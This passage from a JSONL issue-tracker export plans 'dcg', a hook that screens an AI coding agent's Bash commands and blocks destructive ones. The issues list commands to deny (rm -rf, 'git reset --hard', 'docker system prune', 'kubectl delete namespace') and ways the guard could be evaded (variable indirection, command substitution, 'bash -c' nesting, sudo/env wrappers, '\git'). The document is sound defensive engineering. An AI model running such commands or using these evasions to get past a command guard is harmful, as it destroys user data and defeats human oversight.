Budget\n\n| Operation | Budget | Typical |\n|-----------|--------|---------|\n| Tier 1 regex check | \u003c100μs | 1-10μs |\n| Heredoc extraction | \u003c1ms | 100-500μs |\n| Language detection | \u003c100μs | 10-50μs |\n| AST parsing | \u003c5ms | 500μs-2ms |\n| Pattern matching | \u003c1ms | 100-500μs |\n| **Total (heredoc path)** | \u003c10ms | 1-5ms |\n\n## Implementation Priority\n\n1. **First**: Implement Tier 1 with `regex` crate\n2. **Second**: Add heredoc extraction logic\n3. **Third**: Integrate ast-grep for Tier 2\n4. **Fourth**: Optimize based on benchmarks\n\n## Dependencies\n\n```toml\n# Tier 1: Fast regex\nregex = \"1.10\"  # Already highly optimized\n\n# Tier 2: AST analysis\nast-grep-core = \"0.40\"\nast-grep-language = { version = \"0.37\", features = [\"bash\", \"python\", \"javascript\"] }\n```\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:54:46.613326588-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:37:42.934624617-05:00","closed_at":"2026-01-07T19:37:42.934624617-05:00","close_reason":"Duplicate of git_safety_guard-2ta which is integrated into dependency graph"}
{"id":"git_safety_guard-7tg","title":"Epic: Test infrastructure + performance guardrails","description":"# Epic: Test infrastructure + performance guardrails\n\n## Why this epic exists\n\n`dcg` runs on every Bash command. That makes it more like a kernel hook than a typical CLI:\n\n- it must never hang\n- it must never panic\n- it must have bounded worst-case latency\n\nAs we add complex logic (execution-context parsing, heredoc extraction, AST matching, repo scanning), the only sustainable way to maintain trust is to encode invariants and budgets in automated guardrails.\n\n## Goals\n\n1. Property-based tests for core invariants (determinism, idempotence, no panics).\n2. Fuzzing harness for high-risk parsers/tokenizers/extractors.\n3. Performance benchmarks with budgets (fast path and slow path) and CI enforcement.\n4. Regression corpora for:\n   - true positives\n   - false positives\n   - bypass attempts\n   - edge cases\n\n## Non-goals\n\n- Chasing high coverage numbers at the expense of signal.\n- Building a heavy telemetry system (optional later).\n\n## Success Criteria\n\n- CI can run a \"core suite\" quickly (unit + integration + key E2E) and a \"deep suite\" on schedule (fuzz/bench/proptest).\n- Performance regressions are caught before release (budgets enforced, not just tracked).\n- Any crash found by fuzzing is captured as a minimal repro and promoted into a regression test.\n","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-07T21:07:59.839695889-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:51:02.770855141-05:00"}
{"id":"git_safety_guard-7tg.1","title":"Property-based tests for evaluator invariants (proptest)","description":"## Objective\n\nAdd property-based tests that encode the invariants we never want to regress.\n\n## Target invariants\n\n1. Normalization idempotence:\n   - `normalize(normalize(cmd)) == normalize(cmd)`\n2. Determinism:\n   - evaluating the same input twice yields the same decision and match identity\n3. No panics:\n   - evaluation never panics for arbitrary UTF-8 input\n4. Bounded behavior:\n   - overly large inputs are handled without pathological allocations\n\n## Scope\n\n- Focus on the shared evaluator entrypoint.\n- Keep strategies controlled to avoid CI flakiness.\n- Mark the slowest tests `#[ignore]` and run them in a deeper CI job.\n\n## Acceptance criteria\n\n- Proptest suite exists and runs locally.\n- CI can run a small proptest subset reliably.\n- Any discovered bug results in a reduced regression test.\n","status":"closed","priority":1,"issue_type":"task","assignee":"RusticPuma","created_at":"2026-01-07T21:12:38.559130823-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:46:28.670954152-05:00","closed_at":"2026-01-08T00:46:28.670954152-05:00","close_reason":"Property tests implemented with proptest: (1) normalization_is_idempotent, (2) evaluation_is_deterministic, (3) evaluation_never_panics, (4) handles_large_inputs, (5) empty_and_whitespace_allowed. Fixed Cow borrow issue by using into_owned(). All 103 lib + 92 main + 140 E2E tests pass.","dependencies":[{"issue_id":"git_safety_guard-7tg.1","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:09.5251165-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.1","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:26:43.044726491-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:26:48.30731798-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.2","title":"Fuzzing harness for high-risk parsers/tokenizers (cargo-fuzz)","description":"## Objective\n\nAdd fuzz targets for the components most likely to panic or hang:\n\n- hook JSON parsing\n- shell tokenizer / execution-context classifier\n- heredoc extractor\n- shared evaluator entrypoint\n\n## Requirements\n\n- Use `cargo-fuzz` (nightly) with time-limited CI runs.\n- Add at least these fuzz targets:\n  - `evaluate` (full evaluator)\n  - `hook_input` (JSON parser)\n  - `tokenizer` (context classifier)\n  - `heredoc_extract`\n\n## Acceptance criteria\n\n- Fuzz targets run locally.\n- CI runs fuzzing for a bounded time (e.g., 5 minutes per target on schedule).\n- Any found crash becomes a regression test.\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T21:12:43.859065882-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:54:58.127555188-05:00","closed_at":"2026-01-08T00:54:58.127555188-05:00","close_reason":"Implemented 4 fuzz targets (evaluate, hook_input, context, normalize). Fuzzing discovered a regex backtracking panic bug (git_safety_guard-hcj).","dependencies":[{"issue_id":"git_safety_guard-7tg.2","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:14.712645803-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.2","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:26:53.558806407-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.2","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:26:58.789818571-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.2","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T21:27:04.036438019-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.3","title":"Performance budgets + benchmark enforcement","description":"## Objective\n\nCodify performance budgets and enforce them in CI so `dcg` stays invisible.\n\n## Budgets to encode\n\n- Fast path (no heredoc/inline): p99 under 500us\n- Slow path (heredoc/inline): p99 under 20ms\n- Absolute max: fail-open beyond 50ms\n\nThese numbers can be revised, but must be explicit.\n\n## Requirements\n\n- Benchmarks for:\n  - quick reject / keyword gating\n  - normalization\n  - pack evaluation\n  - overrides/allowlist\n  - heredoc trigger/extract/AST path\n- A CI job that compares benchmarks to budgets (tolerant of variance).\n\n## Acceptance criteria\n\n- Budgets exist as code constants/config.\n- CI can detect large regressions and fail.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:12:49.116455774-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:49.116455774-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.3","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:19.941175632-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.3","depends_on_id":"git_safety_guard-99e.7","type":"blocks","created_at":"2026-01-07T21:27:09.296452284-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.3","depends_on_id":"git_safety_guard-perf","type":"blocks","created_at":"2026-01-07T21:27:14.532426804-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.4","title":"CI workflows: core suite vs deep suite (fuzz/proptest/bench)","description":"## Objective\n\nAdd CI workflows that run the right tests at the right cadence.\n\n## Core suite (per PR)\n\n- `cargo fmt --check`\n- `cargo clippy --all-targets -- -D warnings`\n- `cargo test`\n- selected E2E script coverage\n\n## Deep suite (scheduled or manual)\n\n- proptest ignored tests\n- fuzzing time-limited runs\n- benchmarks with budget checks\n\n## Acceptance criteria\n\n- CI is fast enough for PR iteration.\n- Deep suite can be run without human babysitting.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:12:54.368764056-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:54.368764056-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.4","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:25.153093115-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.4","depends_on_id":"git_safety_guard-7tg.1","type":"blocks","created_at":"2026-01-07T21:27:19.788712506-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.4","depends_on_id":"git_safety_guard-7tg.2","type":"blocks","created_at":"2026-01-07T21:27:25.058948161-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.4","depends_on_id":"git_safety_guard-7tg.3","type":"blocks","created_at":"2026-01-07T21:27:30.317207862-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.4","depends_on_id":"git_safety_guard-7tg.5","type":"blocks","created_at":"2026-01-07T21:27:52.680215771-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-7tg.5","title":"Regression corpus harness (true/false positives + bypass attempts)","description":"## Objective\n\nCreate and maintain a small, curated corpus of high-signal command cases and a harness that runs them through:\n\n- hook JSON path\n- CLI evaluator path\n\n## Corpus categories\n\n- `true_positives/` (must block)\n- `false_positives/` (must allow)\n- `bypass_attempts/` (must block or warn)\n- `edge_cases/` (must not crash/hang)\n\n## Output/logging requirements\n\n- Harness prints per-case:\n  - description\n  - expected decision\n  - actual decision\n  - rule id when matched\n\n## Acceptance criteria\n\n- Corpus harness runs in CI.\n- Adding a new regression is easy and does not require writing Rust test code each time.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:12:59.634711502-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:12:59.634711502-05:00","dependencies":[{"issue_id":"git_safety_guard-7tg.5","depends_on_id":"git_safety_guard-7tg","type":"parent-child","created_at":"2026-01-07T21:13:30.382488184-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.5","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:27:42.160263516-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-7tg.5","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:27:47.443108668-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-8wt","title":"Create comprehensive test suite for heredoc detection","description":"## Objective\n\nCreate comprehensive test coverage for heredoc detection and AST-based pattern matching, including unit tests, integration tests, and bypass attempt tests.\n\n## Test Categories\n\n### 1. Unit Tests\n\n#### Heredoc Detection Tests\n\n- Bash heredoc variants: `\u003c\u003cEOF`, `\u003c\u003c-EOF`, `\u003c\u003c\u003c`, `\u003c\u003c'EOF'`, `\u003c\u003c\"EOF\"`\n- Python inline scripts: `python3 -c ...`\n- Node.js: `node -e ...`, `node \u003c\u003cEOF`\n- Perl: `perl -e ...`, `perl \u003c\u003c'END'`\n- Ruby: `ruby -e ...`, heredoc variants\n\n#### Language Detection Tests\n\n- Detection from command prefix (python3, node, ruby, perl, bash)\n- Detection from shebang (`#!/usr/bin/env python3`)\n- Detection from content heuristics (bounded)\n- Fallback behavior for unknown languages\n\n#### Pattern Matching Tests\n\n- Each destructive pattern per language (high-signal)\n- Each safe/negative pattern (things that look dangerous but aren't)\n- Edge cases in quoting and escaping\n\n### 2. Integration Tests\n\n#### Pipeline Tests\n\n- Full flow from JSON input to block/allow decision\n- Heredoc commands correctly trigger deep analysis\n- Non-heredoc commands still use fast path\n- Performance within latency budget\n\n#### Error Handling Tests\n\n- Malformed heredoc syntax\n- Unparseable content\n- Unknown languages fall back gracefully\n- Timeout handling (fail-open in hook mode)\n\n### 3. Bypass Attempt Tests\n\nCurate a set of realistic bypass attempts we want to cover, e.g.:\n\n- variable indirection (`CMD=rm; $CMD -rf ...`)\n- command substitution (`$(echo rm) -rf ...`)\n- `bash -c` nesting\n\n(These should be weighted toward high-signal, common bypasses; avoid building a giant speculative list that creates noisy tests.)\n\n### 4. False Positive Tests\n\nEnsure we DON'T block legitimate uses:\n\n- documentation containing command examples\n- grep/rg patterns searching for dangerous commands\n- `bd create` descriptions that mention dangerous patterns\n\n### 5. Performance Tests\n\n- Tier 1 trigger latency\n- extraction latency\n- AST match latency (bounded)\n- large heredoc handling (size limits)\n\n## Test infrastructure sketch\n\n```\ntests/\n  fixtures/\n    heredocs/\n    bypass_attempts/\n    false_positives/\n```\n\n## Acceptance Criteria\n\n- Test suite is structured so failures are easy to attribute (tier1/extract/lang/match).\n- Includes a curated corpus that covers:\n  - main heredoc forms\n  - at least one example per supported language\n  - a small set of realistic bypass attempts\n  - a strong false-positive regression set\n- Enforces policy behaviors:\n  - hook fail-open on parse/timeout\n  - severity mapping (deny vs warn)\n- Provides clear logs/assert messages so CI failures are actionable.\n","notes":"Added focused heredoc coverage: unit tests for \u003c\u003c~ indent-stripped extraction, quoted delimiter tracking, interpreter-prefix + shebang-based language detection; evaluator integration tests for heredoc deny/allow behavior + allowlist override; quality gates passed (cargo fmt/check/clippy/test + scripts/e2e_test.sh: 176/176).","status":"closed","priority":1,"issue_type":"task","assignee":"CrimsonFalcon","created_at":"2026-01-07T18:40:09.282575411-05:00","created_by":"ubuntu","updated_at":"2026-01-08T07:06:42.366531098-05:00","closed_at":"2026-01-08T07:06:42.366531098-05:00","close_reason":"Completed (comprehensive heredoc unit+integration tests; all gates green)","dependencies":[{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T18:40:16.212012296-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-unit","type":"blocks","created_at":"2026-01-07T19:37:43.125748306-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-unit","type":"supersedes","created_at":"2026-01-07T21:15:31.580734421-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-8wt","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:49:53.774088173-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e","title":"Epic: Core Pipeline Correctness \u0026 Determinism","description":"# Epic: Core Pipeline Correctness \u0026 Determinism\n\n## Why this epic exists\n\n`dcg` is only useful if it is **correct, predictable, and consistent**:\n\n- Correct: enabled packs actually run when their keywords appear.\n- Predictable: the same input yields the same allow/deny + the same reason.\n- Consistent: hook-mode decisions match `dcg test` and any future \"explain\" tooling.\n\nRight now the codebase has a critical architectural correctness gap:\n\n- Hook mode short-circuits early when the top-level command contains no `git`/`rm` (`src/main.rs:587`).\n- `global_quick_reject` also only checks `git`/`rm` (`src/packs/mod.rs:383`).\n\nAs a result, **non-core packs (docker/kubectl/databases/etc.) are effectively unreachable in real hook traffic**, even if enabled in config. This is a trust-destroying failure mode because the CLI (`dcg test`) *can* report a block while the hook *allows* the same command.\n\nWe also have a determinism gap:\n\n- Pack evaluation order is currently based on iterating a `HashSet` (`src/packs/mod.rs:299+`), which is not stable.\n- If multiple packs would block, the user-visible reason (and sometimes which pack is attributed) can vary run-to-run.\n\nFinally, the project is mid-migration:\n\n- Legacy pattern matching exists in `src/main.rs` and duplicates core pack patterns.\n- Hook input parsing and denial output are duplicated between `src/main.rs` and `src/hook.rs`.\n\nThis epic fixes the above so future features (false-positive immunity, heredoc scanning, AST analysis, explainability) are built on a solid, deterministic foundation.\n\n## Goals\n\n1. **Pack reachability:** if an enabled pack’s keywords appear in the command, the pack is actually evaluated in hook mode.\n2. **Deterministic decisions:** stable pack ordering + stable pattern identity in results.\n3. **Single source of truth:** one hook parser and one allow/deny pipeline used by hook mode and CLI test mode.\n4. **Performance preserved:** keep the hot path fast (microseconds) and avoid per-invocation regex compilation.\n5. **Naming alignment:** eliminate `git_safety_guard`/`dcg` naming drift in env vars, scripts, docs, and output.\n\n## Non-goals (for this epic)\n\n- Adding new destructive patterns/categories (handled by the pack/library work).\n- Backwards compatibility guarantees (early-stage project; prefer correctness and clarity).\n\n## Success Criteria\n\n- With `containers.docker` enabled, `docker system prune` is blocked in *hook mode* (stdin JSON) and in `dcg test`, with the same pack attribution and stable reason.\n- With `kubernetes.kubectl` enabled, `kubectl delete namespace foo` is blocked similarly.\n- Re-running the same blocked input 100 times yields identical `pack_id`/`pattern_name` attribution.\n- The hook + CLI paths share one evaluator so parity is enforced by design.\n- No per-command regex compilation for config overrides on the hot path.\n\n## Notes for future self\n\n- This epic must be completed **before** we trust any new pack work or any UX/\"explain\" features.\n- If we later add a scoring system (severity/precision), this epic provides the deterministic substrate (stable ordering + stable pattern IDs).\n","status":"open","priority":0,"issue_type":"epic","created_at":"2026-01-07T19:57:03.282180904-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:50:49.81117776-05:00"}
{"id":"git_safety_guard-99e.1","title":"BUG: Non-core packs are unreachable in hook mode (global quick reject)","description":"## Summary\n\nIn hook mode, `dcg` returns early for any command that does not contain `git` or `rm`, which makes all non-core packs (docker/kubectl/databases/etc.) effectively unreachable in real Claude Code hook traffic.\n\nThis is a correctness bug and a trust issue because `dcg test` *can* report a block while the actual hook path silently allows.\n\n## Steps to Reproduce\n\nPrereq: enable a non-core pack (e.g., `containers.docker`) in config.\n\nInput (hook JSON):\n```json\n{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"docker system prune\"}}\n```\n\n- Expected: DENY (pack `containers.docker`, pattern `system-prune`).\n- Actual (today): ALLOW due to early return at `src/main.rs:587` and `global_quick_reject` only checking `git`/`rm`.\n\n## Root cause\n\n- `src/main.rs:587`: `if quick_reject(\u0026command) \u0026\u0026 global_quick_reject(\u0026command) { return; }`\n- `src/packs/mod.rs:383`: `global_quick_reject` only checks for substrings `git` and `rm`.\n\nSo any command lacking these substrings exits before `REGISTRY.check_command(...)` runs.\n\n## Design constraints\n\n- Must preserve hot-path performance for the 99% case.\n- Must remain correct under arbitrary enabled pack sets.\n\n## Proposed fix options\n\n### Option A (recommended): pack-aware global quick reject\n\n- After loading config, compute enabled packs.\n- Build a fast keyword-gating check that returns “definitely safe to skip packs” only if the command contains **none** of:\n  - core keywords (`git`, `rm`)\n  - keywords for enabled packs (`docker`, `kubectl`, `psql`, etc.)\n\nImplementation can start simple:\n- iterate the enabled packs’ `Pack.keywords` and `memmem::find` for each keyword\n- (optional later) replace with an Aho-Corasick automaton or `regex::RegexSet` for large keyword sets\n\n### Option B: delete global quick reject, rely on per-pack `might_match`\n\n- Always run `REGISTRY.check_command` (it already keyword-gates per pack).\n- Might be slightly slower but likely still fine; measure.\n\n## Acceptance Criteria\n\n1. With `containers.docker` enabled, `docker system prune` is denied in hook mode.\n2. With `kubernetes.kubectl` enabled, `kubectl delete namespace foo` is denied in hook mode.\n3. With `database.postgresql` enabled, destructive SQL strings (if passed directly) are denied when appropriate.\n4. `dcg test` and hook mode agree for the same command.\n5. Add regression tests that would have caught this:\n   - a unit/integration test that runs the hook pipeline on a JSON input and asserts denial for a non-git/rm command.\n\n## Notes\n\nThis bug blocks meaningful work on most non-core packs until fixed.\n","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-01-07T19:58:01.855008972-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:47:34.859535386-05:00","closed_at":"2026-01-07T23:47:34.859535386-05:00","close_reason":"BUG FIXED: Non-core packs now reachable in hook mode. pack_aware_quick_reject implemented, regression tests added to e2e_test.sh.","dependencies":[{"issue_id":"git_safety_guard-99e.1","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T19:58:01.8564148-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.1.1","title":"Implement pack-aware global quick reject","description":"## Objective\n\nFix the hook pipeline so that enabled non-core packs are evaluated when their keywords appear in the command.\n\n## Background\n\nThe current hook pipeline returns early when the command contains neither `git` nor `rm`, which prevents packs like Docker/Kubernetes/DB from ever running.\n\nSee parent bug for reproduction.\n\n## Root Cause Locations\n\n- `src/main.rs:587`: Early return condition only checks `git`/`rm`\n- `src/packs/mod.rs:383`: `global_quick_reject` only checks for substrings `git` and `rm`\n\n## Implementation Plan\n\n### Phase 1: Simple Keyword Union (MVP)\n\n1. Load config (already done in hook mode) and compute `enabled_pack_ids()`.\n2. Expand enabled categories to concrete pack IDs (use `PackRegistry::expand_enabled`).\n3. Build a **keyword union** from all enabled packs' `Pack.keywords`.\n4. Replace the current early-return condition with:\n   - \"return early only if no enabled pack keywords exist in the command\"\n\n### Suggested Algorithm\n\n```rust\n/// Returns true if the command can be safely skipped (no relevant keywords)\nfn pack_aware_quick_reject(cmd: \u0026str, enabled_keywords: \u0026[\u0026str]) -\u003e bool {\n    // Fast path: use memchr::memmem for each keyword\n    for kw in enabled_keywords {\n        if memchr::memmem::find(cmd.as_bytes(), kw.as_bytes()).is_some() {\n            return false;  // Keyword found, must evaluate packs\n        }\n    }\n    true  // No keywords found, safe to skip\n}\n```\n\n### Phase 2: Aho-Corasick Optimization (if needed)\n\nIf the keyword union grows large (\u003e20 keywords), replace with Aho-Corasick automaton:\n\n```rust\nuse aho_corasick::AhoCorasick;\n\nstatic KEYWORD_AUTOMATON: LazyLock\u003cAhoCorasick\u003e = LazyLock::new(|| {\n    let keywords = collect_all_enabled_keywords();\n    AhoCorasick::new(\u0026keywords).expect(\"valid keywords\")\n});\n\nfn pack_aware_quick_reject(cmd: \u0026str) -\u003e bool {\n    !KEYWORD_AUTOMATON.is_match(cmd)\n}\n```\n\n## Performance Budget\n\n- **Target:** \u003c10μs for quick reject on typical commands\n- **Panic threshold:** \u003e100μs (indicates regression)\n- **Zero allocations** on the hot path after initialization\n\n## Case Sensitivity\n\n- CLI tool names (git, docker, kubectl): case-sensitive (Linux convention)\n- SQL keywords (DROP, DELETE): may need both cases - defer to pack keyword definitions\n\n## Considerations\n\n- Keep this check separate from the legacy `quick_reject` so it's not accidentally constrained to `git`/`rm` again.\n- Build the keyword union once per invocation, ideally without heap churn.\n- Consider word-boundary matching in Phase 3 (see 99e.8) to avoid false triggers on substrings like \"digit\" containing \"git\".\n\n## Acceptance Criteria\n\n- `docker system prune` reaches `REGISTRY.check_command` when docker pack is enabled.\n- `kubectl delete namespace foo` reaches `REGISTRY.check_command` when kubectl pack is enabled.\n- For a command like `ls -la`, the hook returns early (no expensive regex) and remains sub-millisecond.\n- Benchmark shows \u003c10μs for quick reject path.","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Implement/verify regression coverage in `git_safety_guard-99e.1.2`:\n  - hook JSON path denies `docker system prune` when `containers.docker` enabled\n  - hook JSON path denies a kubectl destructive example when `kubernetes.kubectl` enabled\n  - parity with `dcg test` for the same commands\n- Add a perf benchmark/regression in `git_safety_guard-99e.7` that exercises the pack-aware keyword gate on:\n  - a typical allow command (no keywords)\n  - a command containing an enabled-pack keyword","status":"closed","priority":0,"issue_type":"task","created_at":"2026-01-07T19:58:22.543207508-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:47:26.020247486-05:00","closed_at":"2026-01-07T23:47:26.020247486-05:00","close_reason":"Implementation verified complete. pack_aware_quick_reject is working in hook mode for all enabled packs (docker/kubectl/postgresql/redis/terraform). Added 17 regression tests to e2e_test.sh covering non-core pack reachability. All 137 e2e tests pass.","dependencies":[{"issue_id":"git_safety_guard-99e.1.1","depends_on_id":"git_safety_guard-99e.1","type":"parent-child","created_at":"2026-01-07T19:58:22.54465821-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.1.2","title":"Add regression tests: hook reaches non-core packs","description":"## Objective\n\nAdd tests that would fail under the current bug (non-core packs unreachable) and pass once fixed.\n\n## Why tests are critical\n\nThis bug is easy to reintroduce during future performance work (e.g., adding new global quick rejects). We need a permanent regression test suite that exercises:\n\n- Hook-mode pipeline (stdin JSON) end-to-end\n- Non-core pack enablement\n- CLI vs hook consistency\n\n## Test plan\n\n### 1) Hook-mode integration test\n\n- Build a JSON input for `tool_name=Bash` and command `docker system prune`.\n- Ensure docker pack is enabled via config for the test (env var override or temp config file).\n- Execute the actual binary in test harness (or call the hook pipeline function directly if exposed).\n- Assert:\n  - stdout contains JSON\n  - `permissionDecision` is `deny`\n  - pack attribution includes `containers.docker` (once deterministic metadata is implemented)\n\n### 2) CLI `dcg test` parity test\n\n- Run `dcg test \"docker system prune\" --with-packs containers.docker`.\n- Assert it reports BLOCKED.\n- (Optionally) ensure hook mode reports the same.\n\n### 3) Negative control\n\n- With docker pack enabled, `docker ps` should ALLOW.\n\n## Acceptance criteria\n\n- Tests fail on current main branch (before bugfix) and pass after.\n- Tests run fast and do not require network.\n","status":"closed","priority":0,"issue_type":"task","created_at":"2026-01-07T19:58:43.071778915-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:48:07.318723517-05:00","closed_at":"2026-01-07T23:48:07.318723517-05:00","close_reason":"Added 10 unit tests for pack_aware_quick_reject, pack registry, and full pipeline integration. Verified E2E tests (137 total) all pass including non-core pack tests for docker, kubectl, postgresql, redis, terraform.","dependencies":[{"issue_id":"git_safety_guard-99e.1.2","depends_on_id":"git_safety_guard-99e.1","type":"parent-child","created_at":"2026-01-07T19:58:43.073195963-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.10","title":"Hardening: global input size limits + fail-open policy (DoS resistance)","description":"## Objective\n\nEnsure `dcg` never hangs or spikes unpredictably on pathological inputs by enforcing conservative global limits.\n\nThis is about protecting the *hook hot path* against:\n\n- extremely large hook JSON payloads\n- extremely large command strings (including multiline heredocs)\n- degenerate cases that cause excessive allocation or slow matching\n\n## Proposed limits (v1)\n\n- Max hook input bytes (stdin): e.g., 256 KiB (configurable)\n- Max command bytes after extraction: e.g., 64 KiB (configurable)\n- Max heredoc bytes extracted for Tier 2/3 analysis: e.g., 32 KiB (configurable)\n- Max findings / max matches per command: cap to avoid runaway reporting\n\n## Policy (critical)\n\n- On limit exceeded: **fail-open** (ALLOW) in hook mode, but emit structured log (if enabled) so we can tune.\n- In `dcg test` / `dcg explain` / `dcg scan`, surface as an explicit \"skipped due to limits\" diagnostic.\n\n## Acceptance criteria\n\n- No panics on oversized input.\n- Latency remains bounded even for worst-case long strings.\n- Tests cover:\n  - oversized stdin JSON\n  - oversized command string\n  - oversized heredoc body\n\n## Dependencies\n\n- `git_safety_guard-99e.3.1` (shared evaluator) so limits apply uniformly across hook/CLI/scan.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:03:28.802078342-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:03:28.802078342-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.10","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T22:03:38.188840567-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.10","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T22:03:49.532318215-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.11","title":"Hardening: regex safety audit (prefer linear-time regex where possible)","description":"## Objective\n\nReduce the risk of catastrophic regex backtracking and keep performance predictable by preferring a linear-time regex engine when we don't need backtracking features.\n\n## Background\n\n`fancy-regex` supports lookaround but is a backtracking engine. Even well-intentioned patterns can become slow on adversarial inputs.\n\nThis matters because `dcg` runs on every Bash command.\n\n## Strategy\n\n1) **Classify patterns**\n- Identify which patterns truly require `fancy-regex` features (lookahead/lookbehind).\n- For patterns that do not: migrate to the `regex` crate.\n\n2) **Engine split**\n- Provide a small internal abstraction so packs can use:\n  - `regex::Regex` for linear-time patterns\n  - `fancy_regex::Regex` only when needed\n\n3) **Guardrails**\n- Add micro-benchmarks for representative worst-case inputs.\n- Add a regression test that runs the full evaluator against a corpus of long strings and asserts bounded runtime (coarse, not flaky).\n\n## Acceptance criteria\n\n- Majority of patterns use linear-time regex (where feasible).\n- No functional regressions in safe/destructive matching.\n- Benchmarks show no latency spikes on long inputs.\n\n## Dependencies\n\n- `git_safety_guard-99e.7` (core perf benchmarks) or `git_safety_guard-7tg.3` (budget enforcement)\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:04:06.052716626-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:04:06.052716626-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.11","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T22:04:15.514061614-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.11","depends_on_id":"git_safety_guard-7tg.3","type":"blocks","created_at":"2026-01-07T22:04:26.432379109-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.12","title":"Normalization: strip common wrappers (sudo/env/command/\\git) safely","description":"## Objective\n\nImprove correctness and reduce bypasses/false negatives by normalizing common *wrapper prefixes* so destructive rules match consistently.\n\nThis is a direct follow-up to the migration toward a shared evaluator: normalization should be defined **once** and used by hook, test, explain, and scan.\n\n## Motivation / examples\n\nThese should behave the same as the unwrapped command:\n\n- `sudo git reset --hard` → should match `git reset --hard`\n- `env GIT_DIR=.git git reset --hard` → should match\n- `\\git reset --hard` (bash alias bypass) → should match\n\nAlso important: some wrapper-like commands are *not* wrappers in certain forms:\n\n- `command -v git` is not executing git; it is querying PATH.\n- `env` without a command is just printing env.\n\n## Design constraints\n\n- Be conservative: only strip wrappers when syntax makes it unambiguous.\n- Never change meaning of non-wrapper commands.\n- Preserve the original command for explain output; also keep a normalized form.\n\n## Proposed wrapper set (v1)\n\n### 1) `sudo`\n\n- Strip leading `sudo` and its options:\n  - `-E`, `-H`, `-n`, `-k`, `-K`, `-S`, `-b`\n  - `-u \u003cuser\u003e`, `-g \u003cgroup\u003e`, `-h \u003chost\u003e`, `-p \u003cprompt\u003e`\n  - stop parsing options at `--`\n\n### 2) `env`\n\n- 